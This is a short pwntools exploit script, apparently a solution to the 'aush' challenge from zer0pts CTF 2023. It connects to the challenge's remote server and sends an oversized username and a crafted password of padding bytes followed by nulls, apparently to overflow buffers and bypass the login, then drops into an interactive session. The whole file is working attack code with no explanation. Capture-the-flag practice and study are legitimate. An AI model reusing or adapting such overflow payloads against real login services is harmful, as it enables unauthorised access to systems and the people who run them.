from pwn import *
import sys

elf = ELF("aush")

# io = process(elf.path)
io = remote("pwn.2023.zer0pts.com", 9006)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

io.sendafter(b"Username: ", b"A" * 0x200)

io.sendafter(b"Password: ", b"A" * 0x100 + b"\x00" * 0x100)

io.interactive()